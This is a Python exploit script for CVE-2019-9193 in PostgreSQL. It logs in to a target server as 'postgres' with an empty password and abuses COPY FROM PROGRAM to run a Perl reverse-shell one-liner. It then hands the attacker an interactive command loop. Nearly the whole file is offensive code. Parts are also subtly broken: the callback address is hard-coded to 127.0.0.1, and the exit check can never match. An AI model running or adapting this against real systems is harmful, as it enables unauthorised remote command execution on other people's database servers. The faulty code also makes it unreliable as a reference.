import psycopg2
from psycopg2.extras import RealDictCursor
import multiprocessing
import socket, sys

def PG_RCE():
    print("English Version of Org RCE: https://github.com/skyship36/CVE-2019-9193/blob/master/portgres_rce.py") # Org Creator 
    print("Please Start a Listener on port 2223") # u can Change this if u like - Nano
    RHOST = input("RHOST IP : ") # Target
    RPORT = int(("5432")) # Default port for PostSQL - Nano
    LHOST = ("127.0.0.1") # Since We ar using Sockets we can Only Bind Port's Locally - Nano
    LPORT = int(("2223"))
    
    try:
        r_shell = multiprocessing.Process(target=do_reverse_connection,
                                        args=((RHOST,RPORT,LHOST,LPORT))) #reverse shell (Process start)

        rvs_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP Socket creation
        rvs_server.bind((LHOST, LPORT)) #Binding the attacker's IP and the port to which the victim will connect
        rvs_server.listen(1) # Only one connection is allowed, waiting for the victim

        r_shell.start() # reverse shell (Process start)

        conn, addr = rvs_server.accept() # Allows access when attempting to connect, and returns the connection and address with the visitor in each variable
    except:
        print("Maybe The Port 2223 is Being Used Try Changing it?")
        sys.exit()
    print("Client Connect ", addr)

    while True:
        cmd = (input("(-1 to Exit Shell)\n>> ")+"\n").encode('ascii') # Part that receives commands from attackers

        if cmd == -1:
            conn.close()
            exit(0)

        conn.sendall(cmd)       # The part that sends commands to the victim
        print(conn.recv(4096))  # Part that receives and outputs the result of the command from the victim


def do_reverse_connection(RHOST, RPORT, LHOST, LPORT):
    try:

        USER, PW, DB = "postgres", "", "template1"
    except:
        print("Maybe This Requires a Username And Password? For Auth")
        sys.exit()

    try:

        conn = psycopg2.connect(database=DB, host=RHOST, user=USER, password=PW, port=RPORT)
        pcur=conn.cursor(cursor_factory=RealDictCursor)
        # Since We can run "perl" we can try python -c 'import os;os.system("ls")' 
        cmd_list = [
                'DROP TABLE IF EXISTS RCE_BASE;',
                'CREATE TABLE RCE_BASE(filename text);',
                """COPY RCE_BASE FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);
                $c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);
                system$_ while<>;''';""".format(LHOST,LPORT),
                'DROP TABLE IF EXISTS RCE_BASE;',
            ]

        [pcur.execute(cmd) for cmd in cmd_list]
    except Exception as e:
        print("Looks Like We have a Error", e)
        return PG_RCE()

if __name__ in "__main__" :
    PG_RCE()
